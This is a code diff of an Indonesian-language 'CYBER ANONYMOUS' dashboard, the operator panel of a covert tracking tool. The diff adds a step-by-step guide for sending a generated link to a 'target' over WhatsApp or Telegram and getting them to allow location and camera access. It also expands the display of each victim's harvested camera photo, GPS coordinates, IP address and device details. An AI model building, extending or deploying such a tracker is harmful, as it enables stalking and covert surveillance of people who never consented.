@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CYBER TRACKER // DASHBOARD</title>
+  <title>CYBER ANONYMOUS // DASHBOARD</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -43,15 +43,15 @@
       margin-bottom: 15px;
       text-shadow: 0 0 10px #00ff9d;
     }
-    .header h1 { font-size: 15px; letter-spacing: 3px; }
+    .header h1 { font-size: 13px; letter-spacing: 2px; }
     #logout {
-      padding: 6px 12px;
+      padding: 6px 10px;
       background: transparent;
       border: 1px solid #ff3366;
       color: #ff3366;
       font-family: 'Courier New', monospace;
-      font-size: 11px;
-      letter-spacing: 2px;
+      font-size: 10px;
+      letter-spacing: 1px;
       cursor: pointer;
       text-shadow: 0 0 5px #ff3366;
       border-radius: 3px;
@@ -66,7 +66,7 @@
       background: rgba(10, 20, 30, 0.85);
       border: 1px solid #00ff9d;
       border-radius: 5px;
-      padding: 20px;
+      padding: 18px;
       margin-bottom: 15px;
       box-shadow: 0 0 15px rgba(0,255,157,0.3), inset 0 0 10px rgba(0,255,157,0.03);
       position: relative;
@@ -80,27 +80,34 @@
       box-shadow: 0 0 10px #00ff9d;
     }
     .box-title {
-      font-size: 12px;
+      font-size: 11px;
       letter-spacing: 3px;
       margin-bottom: 15px;
       color: #00ff9d;
       text-shadow: 0 0 8px #00ff9d;
     }
     .user-info {
-      font-size: 13px;
+      font-size: 12px;
       letter-spacing: 1px;
       color: #7dfcce;
     }
     .user-info b { color: #00ff9d; text-shadow: 0 0 8px #00ff9d; }
+    .label { font-size: 10px; letter-spacing: 2px; color: #7dfcce; margin-bottom: 8px; }
+
+    .input-row {
+      display: flex;
+      gap: 6px;
+      align-items: center;
+    }
     input {
-      width: 60%;
+      flex: 1;
       padding: 10px 12px;
       background: rgba(0,255,157,0.05);
       border: 1px solid #00ff9d;
       border-radius: 3px;
       color: #00ff9d;
       font-family: 'Courier New', monospace;
-      font-size: 13px;
+      font-size: 12px;
       letter-spacing: 1px;
       outline: none;
       transition: all 0.3s;
@@ -108,18 +115,18 @@
     input::placeholder { color: rgba(0,255,157,0.4); }
     input:focus { box-shadow: 0 0 12px #00ff9d; background: rgba(0,255,157,0.1); }
     button.gen {
-      padding: 10px 18px;
+      padding: 10px 14px;
       background: transparent;
       border: 1px solid #00ff9d;
       color: #00ff9d;
       font-family: 'Courier New', monospace;
-      font-size: 12px;
-      letter-spacing: 2px;
+      font-size: 11px;
+      letter-spacing: 1.5px;
       cursor: pointer;
       transition: all 0.3s;
       text-shadow: 0 0 5px #00ff9d;
       border-radius: 3px;
-      margin-left: 5px;
+      white-space: nowrap;
     }
     button.gen:hover {
       background: #00ff9d;
@@ -129,25 +136,59 @@
     }
     #link {
       margin-top: 15px;
-      word-break: break-all;
-      font-size: 12px;
+      font-size: 11px;
       line-height: 1.6;
+      display: none;
     }
-    #link a {
+    .link-box {
+      background: rgba(0,0,0,0.3);
+      border: 1px dashed #00ff9d;
+      border-radius: 4px;
+      padding: 12px;
+      margin-bottom: 8px;
+    }
+    .link-box .link-title {
+      font-size: 10px;
+      color: #7dfcce;
+      letter-spacing: 2px;
+      margin-bottom: 8px;
+    }
+    .link-box .link-url {
       color: #00d4ff;
-      text-decoration: none;
       text-shadow: 0 0 5px #00d4ff;
-      border-bottom: 1px dashed #00d4ff;
+      word-break: break-all;
+      font-size: 11px;
+      margin-bottom: 10px;
+      display: block;
     }
-    #link a:hover { text-shadow: 0 0 15px #00d4ff; }
+    .btn-copy {
+      width: 100%;
+      padding: 10px;
+      background: #00ff9d;
+      color: #0a0e14;
+      border: none;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      font-weight: bold;
+      letter-spacing: 2px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .btn-copy:hover {
+      box-shadow: 0 0 20px #00ff9d;
+      transform: scale(1.02);
+    }
+    .btn-copy.copied {
+      background: #00d4ff;
+    }
 
+    /* Data item */
     .item {
       padding: 14px;
       margin-bottom: 12px;
       border-left: 3px solid #00ff9d;
       background: rgba(0,255,157,0.05);
-      font-size: 13px;
-      line-height: 1.7;
       border-radius: 0 5px 5px 0;
       box-shadow: 0 0 10px rgba(0,255,157,0.1);
     }
@@ -158,16 +199,18 @@
       margin-bottom: 10px;
       gap: 10px;
       flex-wrap: wrap;
+      border-bottom: 1px dashed rgba(0,255,157,0.3);
+      padding-bottom: 8px;
     }
     .item-name {
-      font-size: 14px;
+      font-size: 13px;
       font-weight: bold;
       color: #00ff9d;
       text-shadow: 0 0 10px #00ff9d;
       letter-spacing: 2px;
     }
     .item-time {
-      font-size: 11px;
+      font-size: 10px;
       color: #7dfcce;
       letter-spacing: 1px;
     }
@@ -180,43 +223,86 @@
       margin-bottom: 12px;
       display: block;
     }
-    .item-info {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 6px;
-      margin-top: 8px;
-    }
-    .info-row {
+
+    /* Data list - Rapih */
+    .data-list {
       display: flex;
-      align-items: center;
-      gap: 6px;
-      padding: 6px 8px;
-      background: rgba(0,255,157,0.06);
-      border-radius: 3px;
-      border: 1px solid rgba(0,255,157,0.15);
+      flex-direction: column;
+      gap: 4px;
       font-size: 11px;
+    }
+    .data-row {
+      display: flex;
+      padding: 6px 8px;
+      background: rgba(0,255,157,0.04);
+      border-radius: 3px;
+      border-left: 2px solid rgba(0,255,157,0.3);
+      align-items: center;
+      gap: 8px;
+    }
+    .data-row .ico {
+      width: 20px;
+      text-align: center;
+      font-size: 12px;
+      flex-shrink: 0;
+    }
+    .data-row .lbl {
       color: #7dfcce;
+      font-size: 10px;
+      letter-spacing: 1px;
+      min-width: 70px;
+      flex-shrink: 0;
     }
-    .info-row.full { grid-column: 1 / -1; }
-    .info-row .ico { font-size: 13px; }
-    .info-row .txt {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
+    .data-row .val {
+      color: #00ff9d;
       flex: 1;
+      word-break: break-word;
+      text-shadow: 0 0 3px rgba(0,255,157,0.5);
     }
-    .info-row a {
+    .data-row .val a {
       color: #00d4ff;
       text-decoration: none;
       text-shadow: 0 0 5px #00d4ff;
+      border-bottom: 1px dashed #00d4ff;
     }
-    .info-row a:hover { text-shadow: 0 0 15px #00d4ff; }
-    .empty { color: rgba(0,255,157,0.5); font-size: 12px; letter-spacing: 1px; text-align: center; padding: 20px 0; }
+    .data-row .val a:hover { color: #fff; }
+
+    /* Baterai bar */
+    .battery-bar {
+      display: inline-block;
+      width: 60px;
+      height: 12px;
+      border: 1px solid #00ff9d;
+      border-radius: 2px;
+      position: relative;
+      vertical-align: middle;
+      margin-left: 5px;
+    }
+    .battery-bar::after {
+      content: '';
+      position: absolute;
+      right: -4px;
+      top: 3px;
+      width: 2px;
+      height: 4px;
+      background: #00ff9d;
+      border-radius: 0 1px 1px 0;
+    }
+    .battery-fill {
+      height: 100%;
+      background: #00ff9d;
+      box-shadow: 0 0 5px #00ff9d;
+      transition: width 0.5s;
+    }
+    .battery-fill.low { background: #ff3366; box-shadow: 0 0 5px #ff3366; }
+    .battery-fill.mid { background: #ffcc00; box-shadow: 0 0 5px #ffcc00; }
+
+    .empty { color: rgba(0,255,157,0.5); font-size: 11px; letter-spacing: 1px; text-align: center; padding: 20px 0; }
     .status {
-      font-size: 11px;
+      font-size: 10px;
       color: #00ff9d;
       letter-spacing: 1px;
-      margin-top: 8px;
+      margin-top: 6px;
     }
     .status::before {
       content: '●';
@@ -225,11 +311,25 @@
       margin-right: 5px;
     }
     @keyframes blink { 50% { opacity: 0.3; } }
-    .label { font-size: 11px; letter-spacing: 2px; color: #7dfcce; margin-bottom: 8px; }
 
-    @media (max-width: 400px) {
-      .item-info { grid-template-columns: 1fr; }
-      input { width: 55%; }
+    /* Tombol tutup panduan */
+    .btn-close-panduan {
+      margin-top: 12px;
+      font-size: 10px;
+      padding: 8px;
+      letter-spacing: 1.5px;
+      width: 100%;
+      background: transparent;
+      border: 1px solid #00ff9d;
+      color: #00ff9d;
+      font-family: 'Courier New', monospace;
+      cursor: pointer;
+      border-radius: 3px;
+      transition: all 0.3s;
+    }
+    .btn-close-panduan:hover {
+      background: rgba(0,255,157,0.15);
+      box-shadow: 0 0 10px rgba(0,255,157,0.5);
     }
   </style>
 </head>
@@ -237,26 +337,67 @@
   <div class="scanline"></div>
   <div class="wrap">
     <div class="header">
-      <h1>[ CYBER TRACKER ]</h1>
+      <h1>[ CYBER ANONYMOUS ]</h1>
       <button id="logout" onclick="logout()">LOGOUT</button>
     </div>
 
+    <!-- PANEL OPERATOR -->
     <div class="box">
       <div class="box-title">» OPERATOR</div>
       <div class="user-info">USER: <b id="u"></b></div>
       <div class="status">CONNECTED</div>
     </div>
 
+    <!-- PANEL PANDUAN -->
+    <div class="box" id="panduanBox">
+      <div class="box-title">» PANDUAN OPERASI</div>
+      <div class="data-list">
+        <div class="data-row">
+          <span class="ico">1️⃣</span>
+          <span class="val" style="font-size:11px">Masukkan nama target di kolom GENERATE TRACKING LINK</span>
+        </div>
+        <div class="data-row">
+          <span class="ico">2️⃣</span>
+          <span class="val" style="font-size:11px">Klik GENERATE, lalu klik 📋 SALIN LINK</span>
+        </div>
+        <div class="data-row">
+          <span class="ico">3️⃣</span>
+          <span class="val" style="font-size:11px">Kirim link ke target via WhatsApp, Telegram, dll</span>
+        </div>
+        <div class="data-row">
+          <span class="ico">4️⃣</span>
+          <span class="val" style="font-size:11px">Target buka link → Allow lokasi & kamera</span>
+        </div>
+        <div class="data-row">
+          <span class="ico">5️⃣</span>
+          <span class="val" style="font-size:11px">Data masuk otomatis di panel INCOMING DATA</span>
+        </div>
+      </div>
+      <button class="btn-close-panduan" onclick="document.getElementById('panduanBox').style.display='none'">
+        ✕ TUTUP PANDUAN
+      </button>
+    </div>
+
+    <!-- PANEL GENERATE LINK -->
     <div class="box">
       <div class="box-title">» GENERATE TRACKING LINK</div>
       <div class="label">TARGET NAME:</div>
-      <input id="target" placeholder="masukkan nama target" autocomplete="off">
-      <button class="gen" onclick="genLink()">GENERATE</button>
-      <div id="link"></div>
+      <div class="input-row">
+        <input id="target" placeholder="masukkan nama target" autocomplete="off">
+        <button class="gen" onclick="genLink()">GENERATE</button>
+      </div>
+      <div id="link">
+        <div class="link-box">
+          <div class="link-title">» TARGET LINK:</div>
+          <span class="link-url" id="linkUrl"></span>
+          <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 SALIN LINK</button>
+        </div>
+      </div>
     </div>
 
+    <!-- PANEL DATA MASUK -->
     <div class="box">
-      <div class="box-title">» INCOMING LOCATION DATA</div>
+      <div class="box-title">» INCOMING DATA</div>
       <div id="hasil"><span class="empty">Waiting for data...</span></div>
     </div>
   </div>
@@ -287,13 +428,50 @@ window.logout = () => {
   location.href = 'index.html';
 };
 
+let currentLink = '';
+
 window.genLink = () => {
   const target = document.getElementById('target').value.trim() || 'target';
-  const base = location.origin + location.pathname.replace('dashboard.html', '');
-  const url = `${base}track.html?u=${encodeURIComponent(user)}&t=${encodeURIComponent(target)}`;
-  document.getElementById('link').innerHTML = 
-    `» LINK:<br><a href="${url}" target="_blank">${url}</a>`;
+  const base = location.origin;
+  const url = `${base}/track.html?u=${encodeURIComponent(user)}&t=${encodeURIComponent(target)}`;
+  currentLink = url;
+  document.getElementById('linkUrl').innerText = url;
+  document.getElementById('link').style.display = 'block';
+  document.getElementById('btnCopy').innerText = '📋 SALIN LINK';
+  document.getElementById('btnCopy').classList.remove('copied');
 };
+
+window.copyLink = async () => {
+  if (!currentLink) return;
+  const btn = document.getElementById('btnCopy');
+  try {
+    await navigator.clipboard.writeText(currentLink);
+    btn.innerText = '✓ TERSALIN!';
+    btn.classList.add('copied');
+  } catch(e) {
+    const ta = document.createElement('textarea');
+    ta.value = currentLink;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    btn.innerText = '✓ TERSALIN!';
+    btn.classList.add('copied');
+  }
+  setTimeout(() => {
+    btn.innerText = '📋 SALIN LINK';
+    btn.classList.remove('copied');
+  }, 2000);
+};
+
+function batteryBar(level) {
+  if (!level) return '';
+  const num = parseInt(level);
+  let cls = '';
+  if (num <= 20) cls = 'low';
+  else if (num <= 50) cls = 'mid';
+  return `<span class="battery-bar"><span class="battery-fill ${cls}" style="width:${num}%"></span></span>`;
+}
 
 onValue(ref(db, 'lokasi/' + user), snap => {
   const data = snap.val();
@@ -309,23 +487,24 @@ onValue(ref(db, 'lokasi/' + user), snap => {
         <span class="item-time">${new Date(d.waktu).toLocaleString('id-ID')}</span>
       </div>
       ${d.foto ? `<img class="item-foto" src="${d.foto}" alt="foto target">` : ''}
-      <div class="item-info">
+      <div class="data-list">
         ${d.lat ? `
-          <div class="info-row full">
-            <span class="ico">📍</span>
-            <span class="txt">${d.kota ? d.kota + ' — ' : ''}${d.lat.toFixed(4)}, ${d.lng.toFixed(4)}</span>
-          </div>
-          <div class="info-row full">
-            <span class="ico">🗺️</span>
-            <span class="txt"><a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">OPEN MAP</a></span>
-          </div>
+          <div class="data-row"><span class="ico">📍</span><span class="lbl">LOKASI</span><span class="val">${d.kota || ''} ${d.lat.toFixed(4)}, ${d.lng.toFixed(4)}</span></div>
+          <div class="data-row"><span class="ico">🗺️</span><span class="lbl">MAPS</span><span class="val"><a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">Buka Google Maps →</a></span></div>
         ` : ''}
-        ${d.ip ? `<div class="info-row"><span class="ico">🌐</span><span class="txt">${d.ip}</span></div>` : ''}
-        ${d.suhu !== undefined ? `<div class="info-row"><span class="ico">🌡️</span><span class="txt">${Math.round(d.suhu)}°C</span></div>` : ''}
-        ${d.platform ? `<div class="info-row"><span class="ico">💻</span><span class="txt">${d.platform}</span></div>` : ''}
-        ${d.screen ? `<div class="info-row"><span class="ico">📱</span><span class="txt">${d.screen}</span></div>` : ''}
-        ${d.bahasa ? `<div class="info-row"><span class="ico">🗣️</span><span class="txt">${d.bahasa}</span></div>` : ''}
-        ${d.timezone ? `<div class="info-row"><span class="ico">🕒</span><span class="txt">${d.timezone}</span></div>` : ''}
+        ${d.ip ? `<div class="data-row"><span class="ico">🌐</span><span class="lbl">IP ADDRESS</span><span class="val">${d.ip}</span></div>` : ''}
+        ${d.suhu !== undefined ? `<div class="data-row"><span class="ico">🌡️</span><span class="lbl">SUHU</span><span class="val">${Math.round(d.suhu)}°C</span></div>` : ''}
+        ${d.baterai ? `<div class="data-row"><span class="ico">🔋</span><span class="lbl">BATERAI</span><span class="val">${d.baterai} ${d.charging === 'Mengisi' ? '⚡ Mengisi' : ''} ${batteryBar(d.baterai)}</span></div>` : ''}
+        ${d.platform ? `<div class="data-row"><span class="ico">💻</span><span class="lbl">PLATFORM</span><span class="val">${d.platform}</span></div>` : ''}
+        ${d.screen ? `<div class="data-row"><span class="ico">📱</span><span class="lbl">LAYAR</span><span class="val">${d.screen} ${d.pixelRatio ? '· DPR ' + d.pixelRatio : ''}</span></div>` : ''}
+        ${d.cpu ? `<div class="data-row"><span class="ico">⚙️</span><span class="lbl">CPU</span><span class="val">${d.cpu} core</span></div>` : ''}
+        ${d.memori ? `<div class="data-row"><span class="ico">🧠</span><span class="lbl">RAM</span><span class="val">${d.memori} GB</span></div>` : ''}
+        ${d.network ? `<div class="data-row"><span class="ico">📶</span><span class="lbl">JARINGAN</span><span class="val">${d.network}${d.kecepatan ? ' · ' + d.kecepatan : ''}${d.ping ? ' · ' + d.ping : ''}</span></div>` : ''}
+        ${d.bahasa ? `<div class="data-row"><span class="ico">🗣️</span><span class="lbl">BAHASA</span><span class="val">${d.bahasa}</span></div>` : ''}
+        ${d.timezone ? `<div class="data-row"><span class="ico">🕒</span><span class="lbl">ZONA WAKTU</span><span class="val">${d.timezone}</span></div>` : ''}
+        ${d.orientasi ? `<div class="data-row"><span class="ico">🔄</span><span class="lbl">ORIENTASI</span><span class="val">${d.orientasi}</span></div>` : ''}
+        ${d.touch !== undefined ? `<div class="data-row"><span class="ico">👆</span><span class="lbl">LAYAR SENTUH</span><span class="val">${d.touch ? 'Ya' : 'Tidak'}</span></div>` : ''}
+        ${d.online !== undefined ? `<div class="data-row"><span class="ico">${d.online ? '🟢' : '🔴'}</span><span class="lbl">STATUS</span><span class="val">${d.online ? 'Online' : 'Offline'}</span></div>` : ''}
       </div>
     </div>
   `).join('');
